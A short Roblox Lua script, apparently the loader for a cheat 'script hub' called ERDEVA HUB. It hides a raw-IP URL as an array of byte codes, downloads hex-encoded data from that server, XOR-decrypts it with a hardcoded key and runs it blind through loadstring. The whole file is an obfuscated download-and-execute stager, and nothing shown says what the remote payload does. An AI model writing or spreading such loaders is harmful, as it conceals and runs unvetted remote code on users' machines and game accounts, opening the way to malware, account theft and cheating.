local _K = "9V2E_RPDE1H_EYIA_KC94"
local _bUrl = {104,116,116,112,58,47,47,55,56,46,49,53,52,46,49,48,51,46,52,50,58,57,50,57,54,47,103,101,116,115,99,114,105,112,116,63,116,111,107,101,110,61,69,82,68,69,86,65,95,57,56,51,50,55,52,57,56,49,50,55,51,57,49,56,50,55,51}

local _u = ""
for i = 1, #_bUrl do
    _u = _u .. string.char(_bUrl[i])
end
table.clear(_bUrl)
_bUrl = nil

local raw_data = game:HttpGet(_u)
_u = nil

if raw_data and #raw_data > 20 then
    local k_bytes = {string.byte(_K, 1, -1)}
    local k_len = #k_bytes
    local out = table.create(#raw_data / 2)
    local idx = 1
    
    for i = 1, #raw_data, 2 do
        local hex_byte = tonumber(string.sub(raw_data, i, i + 1), 16)
        if hex_byte then
            local k = k_bytes[((idx - 1) % k_len) + 1]
            out[idx] = string.char(bit32.bxor(hex_byte, k))
            idx = idx + 1
        end
    end
    
    local decrypted_code = table.concat(out)
    table.clear(out)
    out = nil
    
    local fn, err = loadstring(decrypted_code)
    if fn then
        fn()
    else
        warn("[ERDEVA HUB] Error: " .. tostring(err))
    end
else
    warn("[ERDEVA HUB] Error! ")
end
